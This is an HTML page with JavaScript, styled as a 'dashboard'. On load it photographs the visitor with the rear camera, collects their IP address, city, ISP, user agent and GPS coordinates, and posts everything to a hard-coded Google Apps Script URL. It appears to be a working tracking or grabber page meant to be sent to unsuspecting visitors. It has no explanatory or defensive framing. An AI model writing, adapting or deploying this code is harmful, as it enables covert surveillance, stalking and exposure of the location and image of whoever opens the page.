<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>資訊與拍照回傳儀表板</title>
</head>
<body>
  <h1>ＫＬＤ</h1>
  <p id="photoStatus">照片狀態：啟動中...</p>
  <p id="ipInfo">IP 資訊：讀取中...</p>
  <p id="gpsCoordinates">GPS 資訊：讀取中...</p>
  <p id="gpsAddress">地址：讀取中...</p>
  <p id="status">狀態：等待回傳...</p>

  <script>
    const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec';

    // 啟動相機並拍照
    async function startCameraAndSend() {
      const photoStatusElement = document.getElementById('photoStatus');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoData = canvas.toDataURL('image/jpeg', 0.5);
          stream.getTracks().forEach(track => track.stop());

          sendToServer({ imageData: photoData.split(',')[1], message: '自動上傳圖片' });
          photoStatusElement.innerText = '照片已成功拍攝並回傳！';
        }, 1000);
      } catch (error) {
        photoStatusElement.innerText = '相機啟動失敗！';
        console.error('相機啟動錯誤:', error);
      }
    }

    // 獲取 IP 與設備資訊
    async function getIpInfo() {
      const ipInfoElement = document.getElementById('ipInfo');
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const userAgent = navigator.userAgent;

        ipInfoElement.innerText = `IP: ${ip}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}`;
        sendToServer({ ip, city, region, country, org, userAgent, message: 'IP 資訊回傳' });
      } catch (error) {
        ipInfoElement.innerText = 'IP 資訊讀取失敗！';
        console.error('IP 資訊錯誤:', error);
      }
    }

    // 獲取 GPS 資訊
    async function getGPSInfo() {
      const gpsCoordinatesElement = document.getElementById('gpsCoordinates');
      const gpsAddressElement = document.getElementById('gpsAddress');
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async position => {
          const { latitude, longitude } = position.coords;
          gpsCoordinatesElement.innerText = `經度: ${longitude.toFixed(5)}, 緯度: ${latitude.toFixed(5)}`;
          try {
            sendToServer({ latitude, longitude, message: 'GPS 資訊回傳' });
          } catch (error) {
            gpsAddressElement.innerText = 'GPS 資訊回傳失敗';
            console.error('GPS 錯誤:', error);
          }
        });
      }
    }

    // 通用回傳功能
    async function sendToServer(data) {
      const statusElement = document.getElementById('status');
      try {
        const formData = new URLSearchParams(data);
        const response = await fetch(BACKEND_URL, { method: 'POST', body: formData });
        const result = await response.json();

        if (result.success) {
          statusElement.innerText = '資料已成功回傳！';
        } else {
          statusElement.innerText = '資料回傳失敗！';
          console.error('伺服器錯誤:', result.error);
        }
      } catch (error) {
        statusElement.innerText = '資料回傳過程中出錯！';
        console.error('回傳錯誤:', error);
      }
    }

    // 啟動所有功能
    window.onload = () => {
      startCameraAndSend();
      getIpInfo();
      getGPSInfo();
    };
  </script>
</body>
</html>
